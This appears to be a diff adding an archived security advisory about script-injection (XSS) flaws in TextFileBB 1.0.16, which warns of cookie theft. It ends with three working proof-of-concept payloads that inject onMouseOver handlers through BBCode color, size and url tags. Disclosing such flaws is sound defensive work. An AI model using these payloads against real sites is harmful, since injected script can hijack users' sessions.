@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/17750/info
+
+TextFileBB is prone to multiple script-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before including it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing the attacker to steal cookie-based authentication credentials. Other attacks are also possible. 
+
+These issues are reported to affect version 1.0.16; other versions may also be vulnerable.
+
+[code][.color=#00F"onMouseOver=&#039;alert(/xss/)&#039; x="]h0n0[/color][/code]
+[code][.size=7" OnMouseOver="alert(/xss/)]Clicky Here [/size][/code]
+[code][.url=http://" OnMouseOver="alert(/xss/)]hmm[/url][/code]
